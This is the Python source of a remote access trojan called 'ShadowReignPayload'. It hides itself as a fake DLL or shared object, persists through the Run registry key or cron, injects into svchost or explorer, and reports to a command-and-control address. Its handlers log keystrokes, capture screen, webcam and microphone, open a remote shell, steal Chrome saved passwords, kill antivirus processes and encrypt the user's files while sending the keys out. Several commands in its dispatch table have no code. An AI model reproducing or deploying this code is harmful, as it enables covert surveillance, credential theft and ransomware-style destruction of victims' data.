import socket
import json
import os
import threading
import subprocess
import platform
import shutil
import pynput.keyboard as kb
import pynput.mouse as ms
import mss
import cv2
import pyaudio
import wave
import pyttsx3
import psutil
import time
import base64
import sqlite3
import tkinter as tk
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import numpy as np
import random
import string
import ctypes
import win32crypt
import zlib
import win32api
import win32con
import win32process
import hashlib
import requests
from urllib.parse import urlparse

def rand_name(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

class ShadowReignPayload:
    def __init__(self):
        self.c2_list = [("192.168.1.133", 5251)]  # Update with your C2 IP
        self.current_c2_index = 0
        self.KEY = hashlib.sha256(b"ShadowReignBoss!").digest()  # Stronger key
        self.sock = None
        self.anti_vm_enabled = True
        self.keylogger = None
        self.running = True
        self.command_queue = []
        self.streaming_screen = False
        self.streaming_webcam = False
        self.streaming_mic = False
        self.hidden_path = self.hide_self()
        self.persistence()
        self.connect()
        threading.Thread(target=self.keep_alive, daemon=True).start()
        threading.Thread(target=self.watchdog, daemon=True).start()  # Auto-restart

    def encrypt(self, data):
        try:
            cipher = AES.new(self.KEY, AES.MODE_GCM)
            ct_bytes, tag = cipher.encrypt_and_digest(data.encode())
            iv = base64.b64encode(cipher.nonce).decode()
            ct = base64.b64encode(ct_bytes).decode()
            tag = base64.b64encode(tag).decode()
            return f"{iv}:{ct}:{tag}"
        except Exception:
            return None

    def decrypt(self, data):
        try:
            iv, ct, tag = data.split(":")
            iv = base64.b64decode(iv)
            ct = base64.b64decode(ct)
            tag = base64.b64decode(tag)
            cipher = AES.new(self.KEY, AES.MODE_GCM, nonce=iv)
            return cipher.decrypt_and_verify(ct, tag).decode()
        except Exception:
            return None

    def hide_self(self):
        try:
            if platform.system() == "Windows":
                hidden_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "Crypto", "RSA", rand_name())
                os.makedirs(hidden_dir, exist_ok=True)
                new_name = f"{rand_name()}.dll"  # Masquerade as a common DLL
                shutil.copy(__file__, os.path.join(hidden_dir, new_name))
                os.remove(__file__)  # Delete original
                return os.path.join(hidden_dir, new_name)
            else:
                hidden_dir = f"/var/lib/{rand_name()}"
                os.makedirs(hidden_dir, exist_ok=True)
                new_name = f"{rand_name()}.so"  # Masquerade as a shared object
                shutil.copy(__file__, os.path.join(hidden_dir, new_name))
                os.remove(__file__)
                return os.path.join(hidden_dir, new_name)
        except Exception:
            return __file__

    def persistence(self):
        try:
            if platform.system() == "Windows":
                key = win32con.HKEY_CURRENT_USER
                reg_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                handle = win32api.RegOpenKeyEx(key, reg_path, 0, win32con.KEY_SET_VALUE)
                win32api.RegSetValueEx(handle, rand_name(), 0, win32con.REG_SZ, f"rundll32 {self.hidden_path},#1")
                win32api.RegCloseKey(handle)
            else:
                cron = f"@reboot python3 {self.hidden_path}"
                subprocess.Popen(f'(crontab -l 2>/dev/null; echo "{cron}") | crontab -', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

    def watchdog(self):
        while self.running:
            try:
                pid = os.getpid()
                if platform.system() == "Windows":
                    process = win32process.GetModuleFileNameEx(win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid), 0)
                    if process != self.hidden_path:
                        subprocess.Popen(f"python {self.hidden_path}", shell=True, creationflags=win32con.CREATE_NO_WINDOW)
                        os._exit(0)
                time.sleep(5)
            except Exception:
                pass

    def send_message(self, message):
        if not self.sock:
            self.queue_offline(message)
            return
        try:
            compressed = zlib.compress(message.encode())
            encrypted = self.encrypt(base64.b64encode(compressed).decode())
            if not encrypted:
                self.queue_offline(message)
                return
            length = len(encrypted)
            length_bytes = length.to_bytes(4, byteorder='big')
            self.sock.sendall(length_bytes)
            self.sock.sendall(encrypted.encode())
        except Exception:
            self.sock = None
            self.connect()

    def connect(self):
        while self.running and not self.sock:
            try:
                if self.sock:
                    self.sock.close()
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                self.sock.settimeout(10)
                self.sock.connect(self.c2_list[self.current_c2_index])
                self.inject_into_process()  # Blend in
                self.send_info()
                self.execute_offline_queue()
                self.listen()
                break
            except Exception:
                self.current_c2_index = (self.current_c2_index + 1) % len(self.c2_list)
                time.sleep(0.5)

    def inject_into_process(self):
        if platform.system() != "Windows":
            return
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] in ["svchost.exe", "explorer.exe"]:
                    pid = proc.info['pid']
                    handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)
                    code = open(self.hidden_path, "rb").read()
                    mem = ctypes.windll.kernel32.VirtualAllocEx(handle, 0, len(code), 0x3000, 0x40)
                    ctypes.windll.kernel32.WriteProcessMemory(handle, mem, code, len(code), 0)
                    ctypes.windll.kernel32.CreateRemoteThread(handle, 0, 0, mem, 0, 0, 0)
                    os._exit(0)  # Kill original process
                    break
        except Exception:
            pass

    def keep_alive(self):
        while self.running:
            try:
                if self.sock:
                    self.send_message(json.dumps({"ping": "heartbeat"}))
            except Exception:
                self.sock = None
                self.connect()
            time.sleep(5)

    def send_info(self):
        info = {
            "os": platform.system(),
            "hostname": socket.gethostname(),
            "ip": socket.gethostbyname(socket.gethostname()),
            "cpu": psutil.cpu_percent(),
            "ram": psutil.virtual_memory().percent,
            "anti_vm": self.anti_vm_enabled
        }
        self.send_message(json.dumps(info))

    def listen(self):
        threading.Thread(target=self._listen, daemon=True).start()

    def _listen(self):
        while self.running and self.sock:
            try:
                length_bytes = self.sock.recv(4)
                if not length_bytes:
                    self.sock = None
                    self.connect()
                    continue
                length = int.from_bytes(length_bytes, byteorder='big')
                data = b""
                while len(data) < length:
                    chunk = self.sock.recv(min(1024, length - len(data)))
                    if not chunk:
                        raise Exception("Socket closed")
                    data += chunk
                cmd = json.loads(self.decrypt(data.decode()))
                self.command_queue.append((cmd["command"], cmd.get("data")))
                self.execute_next()
            except Exception:
                self.sock = None
                self.connect()

    def execute_next(self):
        if not self.command_queue:
            return
        command, data = self.command_queue.pop(0)
        handlers = {
            "keylogger_start": self.keylogger_start,
            "keylogger_stop": self.keylogger_stop,
            "keylogger_dump": self.keylogger_dump,
            "list_files": self.list_files,
            "receive_file": self.receive_file,
            "send_file": self.send_file,
            "screenshot": self.screenshot,
            "record_screen": self.record_screen,
            "webcam_snap": self.webcam_snap,
            "shell": self.shell,
            "dump_hashes": self.dump_hashes,
            "steal_wifi": self.steal_wifi,
            "elevate_privileges": self.elevate_privileges,
            "jumpscare": self.jumpscare,
            "crash_system": self.crash_system,
            "fork_bomb": self.fork_bomb,
            "stream_screen": self.stream_screen,
            "stream_webcam": self.stream_webcam,
            "stream_mic": self.stream_mic,
            "stop_stream": self.stop_stream,
            "toggle_anti_vm": self.toggle_anti_vm,
            "inject": self.inject_process,
            "queue_command": self.queue_command,
            "self_destruct": self.self_destruct,
            "remote_desktop": self.remote_desktop,
            "harvest_creds": self.harvest_creds,
            "record_av": self.record_av,
            "spoof_info": self.spoof_info,
            "clear_logs": self.clear_logs,
            "switch_c2": self.switch_c2,
            "fake_alert": self.fake_alert,
            "encrypt_files": self.encrypt_files,  # New: Encrypt files on target
            "exfil_browser": self.exfil_browser,  # New: Steal browser data
            "disable_av": self.disable_av,        # New: Kill AV processes
            "live_shell": self.live_shell         # New: Live interactive shell
        }
        if command in handlers:
            try:
                handlers[command](data)
            except Exception as e:
                self.send_message(json.dumps({"error": f"{command} failed: {str(e)}"}))

    def queue_offline(self, message):
        self.command_queue.append((json.loads(message)["command"], json.loads(message).get("data")))

    def execute_offline_queue(self):
        while self.command_queue:
            self.execute_next()

    # New Features
    def encrypt_files(self, _):
        try:
            for root, _, files in os.walk(os.path.expanduser("~")):
                for file in files:
                    path = os.path.join(root, file)
                    with open(path, "rb") as f:
                        data = f.read()
                    key = os.urandom(16)
                    cipher = AES.new(key, AES.MODE_CBC)
                    ct = cipher.encrypt(pad(data, AES.block_size))
                    with open(path + ".enc", "wb") as f:
                        f.write(cipher.iv + ct)
                    os.remove(path)
                    self.send_message(json.dumps({"encrypted": path, "key": base64.b64encode(key).decode()}))
            self.send_message(json.dumps({"status": "Files encrypted"}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def exfil_browser(self, _):
        creds = {}
        try:
            if platform.system() == "Windows":
                chrome_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data")
                if os.path.exists(chrome_path):
                    conn = sqlite3.connect(chrome_path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for url, user, pwd in cursor.fetchall():
                        pwd = win32crypt.CryptUnprotectData(pwd)[1].decode()
                        creds[url] = {"user": user, "pass": pwd}
                    conn.close()
            self.send_message(json.dumps({"creds": creds}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def disable_av(self, _):
        av_processes = ["avg", "avast", "bitdefender", "kaspersky", "mcafee", "norton", "eset", "defender"]
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                if any(av in proc.info['name'].lower() for av in av_processes):
                    proc.kill()
            self.send_message(json.dumps({"status": "AV processes terminated"}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def live_shell(self, _):
        self.send_message(json.dumps({"status": "Live shell started"}))
        threading.Thread(target=self._live_shell_loop, daemon=True).start()

    def _live_shell_loop(self):
        while self.running:
            try:
                cmd = self.command_queue[-1][1] if self.command_queue and self.command_queue[-1][0] == "live_shell_cmd" else None
                if cmd:
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
                    self.send_message(json.dumps({"shell_output": output}))
                    self.command_queue.pop(-1)
            except Exception as e:
                self.send_message(json.dumps({"error": str(e)}))
            time.sleep(0.1)

    # Existing Features (Enhanced)
    def keylogger_start(self, _):
        if not self.keylogger:
            self.keylogger = Keylogger(self.sock, self.send_message)
            self.keylogger.start()
            self.send_message(json.dumps({"status": "Keylogger started"}))

    def screenshot(self, _):
        with mss.mss() as sct:
            img = sct.grab(sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0])
            _, buffer = cv2.imencode(".png", np.array(img))
            self.send_message(json.dumps({"screenshot": base64.b64encode(buffer).decode()}))

    def remote_desktop(self, data):
        action = data["action"]
        if action == "start":
            self.streaming_screen = True
            threading.Thread(target=self._remote_desktop_stream, daemon=True).start()
        elif action == "mouse":
            ms.Controller().position = (data["x"], data["y"])
            if data.get("click"):
                ms.Controller().click(ms.Button.left, 1)
        elif action == "key":
            kb.Controller().press(data["key"])
            kb.Controller().release(data["key"])

    def _remote_desktop_stream(self):
        sct = mss.mss()
        while self.streaming_screen:
            img = sct.grab(sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0])
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGRA2BGR)
            _, buffer = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
            self.send_message(json.dumps({"remote_frame": base64.b64encode(buffer).decode()}))
            time.sleep(0.033)

    def self_destruct(self, _):
        try:
            if platform.system() == "Windows":
                subprocess.Popen(f'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {rand_name()} /f', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                subprocess.Popen("crontab -r", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.remove(self.hidden_path)
            self.running = False
            os._exit(0)
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

class Keylogger:
    def __init__(self, sock, send_message):
        self.sock = sock
        self.send_message = send_message
        self.logs = ""
        self.active = False

    def on_press(self, key):
        if self.active:
            self.logs += str(key) + " "

    def start(self):
        self.active = True
        self.listener = kb.Listener(on_press=self.on_press)
        self.listener.start()

    def stop(self):
        self.active = False
        self.listener.stop()

    def dump(self):
        self.send_message(json.dumps({"keylogs": self.logs}))
        self.logs = ""

if __name__ == "__main__":
    payload = ShadowReignPayload()
    while payload.running:
        time.sleep(1)
